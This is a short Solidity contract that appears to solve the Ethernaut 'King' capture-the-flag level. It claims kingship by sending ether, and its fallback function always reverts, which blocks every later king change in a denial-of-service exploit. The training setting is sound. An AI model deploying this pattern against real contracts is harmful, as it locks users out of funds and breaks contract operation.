contract BadKing {
    King public king = King(YOUR_LEVEL_ADDR_HERE);
    
    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        address(king).call.value(1000000000000000000).gas(4000000)();
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    function() external payable {
        revert("Action fails");
    }
}